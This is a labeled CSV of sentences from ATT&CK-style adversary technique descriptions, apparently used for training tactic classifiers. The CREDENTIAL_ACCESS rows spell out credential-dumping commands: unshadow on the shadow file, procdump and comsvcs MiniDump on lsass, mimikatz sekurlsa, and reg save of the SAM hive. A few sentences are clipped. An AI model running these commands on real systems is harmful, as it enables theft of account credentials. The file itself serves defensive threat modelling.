"Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg] or other utilities using the Win32 API.",DEFENSE_EVASION,,,
The Registry of a remote system may be modified to aid in execution of files as part of lateral movement.,DEFENSE_EVASION,,,
It requires the remote Registry service to be running on the target system. for RPC communication.,DEFENSE_EVASION,,,
"On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.",DEFENSE_EVASION,,,
"To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.",DEFENSE_EVASION,,,
"This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",DEFENSE_EVASION,,,
Adversaries may install an older version of the operating system of a network device to weaken security.,DEFENSE_EVASION,,,
"Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.",DEFENSE_EVASION,,,
"On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.",DEFENSE_EVASION,,,
"With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.",DEFENSE_EVASION,,,
The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.,DEFENSE_EVASION,,,
Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption].,DEFENSE_EVASION,,,
"Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image].",DEFENSE_EVASION,,,
Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.,DEFENSE_EVASION,,,
"Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.",DEFENSE_EVASION,,,
"Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.",DEFENSE_EVASION,,,
"To change the operating system in storage, the adversary will typically use the standard procedures available to device operators.",DEFENSE_EVASION,,,
"This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.",DEFENSE_EVASION,,,
"The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.",DEFENSE_EVASION,,,
"To change the operating system in memory, the adversary typically can use one of two methods.",DEFENSE_EVASION,,,
"In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.",DEFENSE_EVASION,,,
This method typically requires administrative level access to the device.,DEFENSE_EVASION,,,
"In the second method for changing the operating system in memory, the adversary would make use of the boot loader.",DEFENSE_EVASION,,,
"The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.",DEFENSE_EVASION,,,
"Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit] method, to directly manipulate running operating system code in memory.",DEFENSE_EVASION,,,
"This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.",DEFENSE_EVASION,,,
"By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before.",DEFENSE_EVASION,,,
"Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption], authentication, via [Network Device Authentication], and perimeter defenses, via [Network Boundary Bridging].",DEFENSE_EVASION,,,
"Adding new capabilities for the adversary’s purpose include [Keylogging], [Multi-hop Proxy], and [Port Knocking].",DEFENSE_EVASION,,,
Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.,DEFENSE_EVASION,,,
"When this method is used in conjunction with [Downgrade System Image], one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.",DEFENSE_EVASION,,,
"By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.",DEFENSE_EVASION,,,
"When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot].",DEFENSE_EVASION,,,
"When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.",DEFENSE_EVASION,,,
"However, live memory modification of the operating system can be combined with [ROMMONkit] to achieve persistence.",DEFENSE_EVASION,,,
"Adversaries may target multi-factor authentication (MFA) mechanisms, (I.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources.",CREDENTIAL_ACCESS,,,
"Use of MFA is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.",CREDENTIAL_ACCESS,,,
"With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.",CREDENTIAL_ACCESS,,,
"Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID.",CREDENTIAL_ACCESS,,,
Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).,CREDENTIAL_ACCESS,,,
Other methods of MFA may be intercepted and used by an adversary to authenticate.,CREDENTIAL_ACCESS,,,
"It is common for one-time codes to be sent via out-of-band communications (email, SMS).",CREDENTIAL_ACCESS,,,
"If the device and/or service is not secured, then it may be vulnerable to interception.",CREDENTIAL_ACCESS,,,
"Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.,CREDENTIAL_ACCESS,,,
Adversaries in possession credentials to [Valid Accounts] may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control.,CREDENTIAL_ACCESS,,,
"To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.",CREDENTIAL_ACCESS,,,
"In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”.",CREDENTIAL_ACCESS,,,
Use of multiple stages may obfuscate the command and control channel to make detection more difficult.,COMMAND_AND_CONTROL,,,
Remote access tools will call back to the first-stage command and control server for instructions.,COMMAND_AND_CONTROL,,,
"The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files.",COMMAND_AND_CONTROL,,,
A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server.,COMMAND_AND_CONTROL,,,
The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.,COMMAND_AND_CONTROL,,,
The different stages will likely be hosted separately with no overlapping infrastructure.,COMMAND_AND_CONTROL,,,
The loader may also have backup first-stage callbacks or [Fallback Channels] in case the original first-stage communication path is discovered and blocked.,COMMAND_AND_CONTROL,,,
"Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. as well as carrying out tasks and requests during routine operations.",EXECUTION,,,
"Native API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.",EXECUTION,,,
"Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs.",EXECUTION,,,
These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.,EXECUTION,,,
Adversaries may abuse these OS API functions as a means of executing behaviors.,EXECUTION,,,
"Similar to [Command and Scripting Interpreter], the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.",EXECUTION,,,
"While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools]).",EXECUTION,,,
Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation.,DEFENSE_EVASION,,,
Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,DEFENSE_EVASION,,,
Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.,DEFENSE_EVASION,,,
They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.,DEFENSE_EVASION,,,
"Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.",DEFENSE_EVASION,,,
"To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.",DEFENSE_EVASION,,,
"When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.",DEFENSE_EVASION,,,
"By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy] or exfiltration of data via [Traffic Duplication].",DEFENSE_EVASION,,,
Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy] to achieve the same goals.,DEFENSE_EVASION,,,
"In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",DEFENSE_EVASION,,,
Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration.,DEFENSE_EVASION,,,
Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,DEFENSE_EVASION,,,
Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks.,DEFENSE_EVASION,,,
"When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header.",DEFENSE_EVASION,,,
Some network designs require NAT for the packets to cross the border device.,DEFENSE_EVASION,,,
A typical example of this is environments where internal networks make use of non-Internet routable addresses.,DEFENSE_EVASION,,,
"When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.",DEFENSE_EVASION,,,
"In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.",DEFENSE_EVASION,,,
"In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.",DEFENSE_EVASION,,,
"Adversaries may use [Patch System Image] to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities.",DEFENSE_EVASION,,,
Network DoS can be performed by exhausting the network bandwidth services rely on.,IMPACT,,,
"Example resources include specific websites, email services, DNS, and web-based applications.",IMPACT,,,
Adversaries have been observed conducting network DoS attacks for political purposes.,IMPACT,,,
A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on.,IMPACT,,,
"For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet.",IMPACT,,,
"This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).",IMPACT,,,
"To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.",IMPACT,,,
"For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service].",IMPACT,,,
Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target.,IMPACT,,,
This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood]s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network.,IMPACT,,,
Almost any network protocol may be used for flooding.,IMPACT,,,
Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.,IMPACT,,,
Botnets are commonly used to conduct network flooding attacks against networks and services.,IMPACT,,,
"In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network.",IMPACT,,,
"Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.",IMPACT,,,
Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target.,IMPACT,,,
This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address.,IMPACT,,,
This third-party server is commonly termed a reflector.,IMPACT,,,
An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim.,IMPACT,,,
"Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used.",IMPACT,,,
"Likewise, one or more reflectors may be used to focus traffic on the target. and network.",IMPACT,,,
"Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack.",IMPACT,,,
Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers.,IMPACT,,,
"The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume.",IMPACT,,,
Two prominent protocols that have enabled Reflection Amplification Floods are DNS.,IMPACT,,,
Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.,DISCOVERY,,,
"Within cloud environments, adversaries may attempt to discover services running on other cloud hosts.",DISCOVERY,,,
"Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.",DISCOVERY,,,
"Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network.",DISCOVERY,,,
The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network.,DISCOVERY,,,
"For example, adversaries can use a mDNS query (such as dns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.",DISCOVERY,,,
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.,DISCOVERY,,,
Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.,DISCOVERY,,,
File sharing over a Windows network occurs over the SMB protocol. can be used to query a remote system for available shared drives using the net view \\\\remotesystem command.,DISCOVERY,,,
It can also be used to query shared drives on the local system using net share.,DISCOVERY,,,
"For macOS, the sharing -l command lists all shared points used for smb services.",DISCOVERY,,,
"Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network.",CREDENTIAL_ACCESS,DISCOVERY,,
Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.,CREDENTIAL_ACCESS,DISCOVERY,,
"Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol.",CREDENTIAL_ACCESS,DISCOVERY,,
"Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay], can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.",CREDENTIAL_ACCESS,DISCOVERY,,
"Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g.",CREDENTIAL_ACCESS,DISCOVERY,,
"IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.",CREDENTIAL_ACCESS,DISCOVERY,,
"In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines.",CREDENTIAL_ACCESS,DISCOVERY,,
"For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.",CREDENTIAL_ACCESS,DISCOVERY,,
Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network.,COMMAND_AND_CONTROL,,,
The list of possible protocols is extensive..,COMMAND_AND_CONTROL,,,
ICMP communication between hosts is one example.,COMMAND_AND_CONTROL,,,
"However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",COMMAND_AND_CONTROL,,,
"For example, HTTPS over port 8088 as opposed to the traditional port 443.",COMMAND_AND_CONTROL,,,
Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.,COMMAND_AND_CONTROL,,,
"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",CREDENTIAL_ACCESS,,,
Credentials can then be used to perform [Lateral Movement] and access restricted information.,CREDENTIAL_ACCESS,,,
Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers.,CREDENTIAL_ACCESS,,,
Additional custom tools likely exist as well.,CREDENTIAL_ACCESS,,,
Adversaries may attempt to dump the contents of /etc/passwd and /etc/shadow to enable offline password cracking.,CREDENTIAL_ACCESS,,,
Most modern Linux operating systems use a combination of /etc/passwd and /etc/shadow to store user account information including password hashes in /etc/shadow.,CREDENTIAL_ACCESS,,,
"By default, /etc/shadow is only readable by the root user.",CREDENTIAL_ACCESS,,,
"The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.,CREDENTIAL_ACCESS,,,
"On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.",CREDENTIAL_ACCESS,,,
"With SYSTEM access, the tools/utilities such as [Mimikatz], [Reg], and secretsdump.py can be used to extract the cached credentials.",CREDENTIAL_ACCESS,,,
Note: Cached credentials for Windows Vista are derived using PBKDF2.,CREDENTIAL_ACCESS,,,
Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API) to simulate the replication process from a remote domain controller using a technique called DCSync.,CREDENTIAL_ACCESS,,,
"Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data.",CREDENTIAL_ACCESS,,,
"DCSync functionality has been included in the ""lsadump"" module in [Mimikatz].",CREDENTIAL_ACCESS,,,
"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.



[Reg] can be used to extract from the Registry. [Mimikatz] can be used to extract secrets from memory.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).,CREDENTIAL_ACCESS,,,
"After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory.",CREDENTIAL_ACCESS,,,
These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement] using [Use Alternate Authentication Material].,CREDENTIAL_ACCESS,,,
"As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.",CREDENTIAL_ACCESS,,,
"For example, on the target host use procdump:



* procdump -ma lsass.exe lsass_dump.",CREDENTIAL_ACCESS,,,
"Locally, mimikatz can be run using:



* sekurlsa::Minidump lsassdump.dmp

* sekurlsa::logonPasswords.",CREDENTIAL_ACCESS,,,
"Built-in Windows tools such as comsvcs.dll can also be used:
* rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full.",CREDENTIAL_ACCESS,,,
Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start.,CREDENTIAL_ACCESS,,,
"Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.",CREDENTIAL_ACCESS,,,
The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages.,CREDENTIAL_ACCESS,,,
"An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",CREDENTIAL_ACCESS,,,
"The following SSPs can be used to access credentials:
* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.",CREDENTIAL_ACCESS,,,
"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.",CREDENTIAL_ACCESS,,,
"By default, the NTDS file (NTDS.dit) is located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.",CREDENTIAL_ACCESS,,,
"In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.",CREDENTIAL_ACCESS,,,
"The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.



* Volume Shadow Copy

* secretsdump.py

* Using the in-built Windows tool, ntdsutil.exe

* Invoke-NinjaCopy.",CREDENTIAL_ACCESS,,,
Adversaries may gather credentials from information stored in the Proc filesystem or /proc.,CREDENTIAL_ACCESS,,,
The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system.,CREDENTIAL_ACCESS,,,
Processes running with root privileges can use this facility to scrape live memory of other running programs.,CREDENTIAL_ACCESS,,,
"If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.",CREDENTIAL_ACCESS,,,
"This functionality has been implemented in the MimiPenguin, an open source tool inspired by Mimikatz.",CREDENTIAL_ACCESS,,,
"The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",CREDENTIAL_ACCESS,,,
Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored.,CREDENTIAL_ACCESS,,,
"The SAM is a database file that contains local accounts for the host, typically those found with the net user command.",CREDENTIAL_ACCESS,,,
Enumerating the SAM database requires SYSTEM level access.,CREDENTIAL_ACCESS,,,
"A number of tools can be used to retrieve the SAM file through in-memory techniques:



* pwdumpx.exe

* [gsecdump]

* [Mimikatz]

* secretsdump.py.",CREDENTIAL_ACCESS,,,
"Alternatively, the SAM can be extracted from the Registry with Reg:



* reg save HKLM\sam sam

* reg save HKLM\system system.",CREDENTIAL_ACCESS,,,
Creddump7 can then be used to process the SAM database locally to retrieve hashes.,CREDENTIAL_ACCESS,,,
"Notes: 

* RID 500 account is the local, built-in administrator.

* RID 501 is the guest account.

* User accounts start with a RID of 1,000+.",CREDENTIAL_ACCESS,,,
"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.",DEFENSE_EVASION,,,
This is common behavior that can be used across different platforms and the network to evade defenses.,DEFENSE_EVASION,,,
"Payloads may be compressed, archived, or encrypted in order to avoid detection.",DEFENSE_EVASION,,,
These payloads may be used during Initial Access or later to mitigate detection.,DEFENSE_EVASION,,,
Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information] for [User Execution].,DEFENSE_EVASION,,,
"Adversaries may also used compressed or archived scripts, such as JavaScript.",DEFENSE_EVASION,,,
Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.,DEFENSE_EVASION,,,
Adversaries may also obfuscate commands executed from payloads or directly via a [Command and Scripting Interpreter].,DEFENSE_EVASION,,,
"Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",DEFENSE_EVASION,,,
Adversaries may use binary padding to add junk data and change the on-disk representation of malware.,DEFENSE_EVASION,,,
"This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.",DEFENSE_EVASION,,,
Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.,DEFENSE_EVASION,,,
Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code.,DEFENSE_EVASION,,,
Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries.,DEFENSE_EVASION,,,
These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.,DEFENSE_EVASION,,,
"Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing].",DEFENSE_EVASION,,,
Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.,DEFENSE_EVASION,,,
Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files.,DEFENSE_EVASION,,,
HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects.,DEFENSE_EVASION,,,
"Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents.",DEFENSE_EVASION,,,
HTML5 also introduced a download attribute that may be used to initiate file downloads.,DEFENSE_EVASION,,,
Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes.,DEFENSE_EVASION,,,
"Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as text/plain and/or text/html.",DEFENSE_EVASION,,,
"Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information]), potentially bypassing content filters.",DEFENSE_EVASION,,,
"For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as msSaveBlob.",DEFENSE_EVASION,,,
"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed.",DEFENSE_EVASION,,,
They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.,DEFENSE_EVASION,,,
A good example of this is when malware is detected with a file signature and quarantined by anti-virus software.,DEFENSE_EVASION,,,
"An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",DEFENSE_EVASION,,,
Adversaries may perform software packing or virtual machine software protection to conceal their code.,DEFENSE_EVASION,,,
Software packing is a method of compressing or encrypting an executable.,DEFENSE_EVASION,,,
Packing an executable changes the file signature in an attempt to avoid signature-based detection.,DEFENSE_EVASION,,,
Most decompression techniques decompress the executable code in memory.,DEFENSE_EVASION,,,
Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run.,DEFENSE_EVASION,,,
A virtual machine is then called to run this code.,DEFENSE_EVASION,,,
Utilities used to perform software packing are called packers.,DEFENSE_EVASION,,,
Example packers are MPRESS and UPX.,DEFENSE_EVASION,,,
"A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",DEFENSE_EVASION,,,
Adversaries may use steganography techniques in order to prevent the detection of hidden information.,DEFENSE_EVASION,,,
"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.



[Duqu] was an early example of malware that used steganography.",DEFENSE_EVASION,,,
It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.,DEFENSE_EVASION,,,
"By the end of 2017, a threat group used Invoke-PSImage to hide [PowerShell] commands in an image file (.png) and execute the code on a victim's system.",DEFENSE_EVASION,,,
In this particular case the [PowerShell] code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.,DEFENSE_EVASION,,,
Adversaries may buy and/or steal capabilities that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them.",RESOURCE_DEVELOPMENT,,,
"Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities.",RESOURCE_DEVELOPMENT,,,
Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.,RESOURCE_DEVELOPMENT,,,
"In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities.",RESOURCE_DEVELOPMENT,,,
"Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.",RESOURCE_DEVELOPMENT,,,
"In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries).",RESOURCE_DEVELOPMENT,,,
"This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.",RESOURCE_DEVELOPMENT,,,
Adversaries may buy and/or steal code signing certificates that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"Prior to [Code Signing], adversaries may purchase or steal code signing certificates for use in operations.",RESOURCE_DEVELOPMENT,,,
The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity.,RESOURCE_DEVELOPMENT,,,
Adversaries may also steal code signing materials directly from a compromised third-party.,RESOURCE_DEVELOPMENT,,,
Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography] with [Web Protocols]) or even enabling [Adversary-in-the-Middle] if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate]).",RESOURCE_DEVELOPMENT,,,
The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity.,RESOURCE_DEVELOPMENT,,,
"Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.",RESOURCE_DEVELOPMENT,,,
Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.,RESOURCE_DEVELOPMENT,,,
"Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.",RESOURCE_DEVELOPMENT,,,
"After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate]) on infrastructure under their control.",RESOURCE_DEVELOPMENT,,,
"Adversaries may buy, steal, or download exploits that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
"Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.",RESOURCE_DEVELOPMENT,,,
"In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities.",RESOURCE_DEVELOPMENT,,,
"Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.",RESOURCE_DEVELOPMENT,,,
"An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits.",RESOURCE_DEVELOPMENT,,,
There is usually a delay between when an exploit is discovered and when it is made public.,RESOURCE_DEVELOPMENT,,,
An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.,RESOURCE_DEVELOPMENT,,,
"Adversaries may buy, steal, or download malware that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
